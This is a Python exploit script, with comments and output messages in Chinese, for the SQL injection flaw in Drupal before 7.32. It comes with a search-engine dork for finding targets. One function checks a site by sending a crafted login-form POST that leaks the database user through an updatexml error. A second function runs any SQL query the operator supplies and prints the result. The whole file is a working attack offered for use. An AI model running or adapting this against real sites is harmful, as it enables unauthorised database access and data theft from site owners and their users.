#!/usr/bin/env python
# author:Xiaogang
# Help: Drupal <7.32 sql注入漏洞
# inurl:/?q=node&destination=node

import requests
import sys
import re


def test(url):
    target = url + '/?q=node&destination=node'
    post_data = '''pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(1,concat(1,0x7e,(select%20user()),0x7e),1)%23]=bob&name[0]=a'''

    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        response = requests.request("POST", target, headers=headers, data=post_data, timeout = 10)
        if response.text:
            if "XPATH syntax error" in response.text:
                pattern = "XPATH syntax error: &#039;(.*)&#039;"
                data = re.search(pattern, response.text).group(0)
                data = data.lstrip("XPATH syntax error: &#039;").rstrip("&#039;")
                print("存在sql注入漏洞\n返回值：", data)
            else:
                print("漏洞不存在")
        else:
            print("访问失败")
    except Exception as e:
        print("发生错误：{}".format(e))


def attack(url, sql):
    target = url + '/?q=node&destination=node'
    post_data = '''pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(1,concat(1,0x7e,(''' + sql + '''),0x7e),1)%23]=bob&name[0]=a'''

    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        response = requests.request("POST", target, headers=headers, data=post_data)
        if response.status_code == 500:
            if "XPATH syntax error" in response.text:
                pattern = "XPATH syntax error: &#039;(.*)&#039;"
                data = re.search(pattern, response.text).group(0)
                data = data.lstrip("XPATH syntax error: &#039;").rstrip("&#039;")
                print("执行成功")
                print("返回值：", data)
            else:
                print("漏洞不存在")
        else:
            print("访问失败")
    except Exception as e:
        print("发生错误：{}".format(e))


def main():
    args = sys.argv
    if len(args) == 4:
        attack(args[1], args[3])
    elif len(args) == 2:
        test(args[1])
    else:
        print("Usage: python {} {}".format(args[0], "url地址"))
        print("Usage: python {} {} -sql {}".format(args[0], "url地址","sql语句"))


if __name__ == '__main__':
    main()
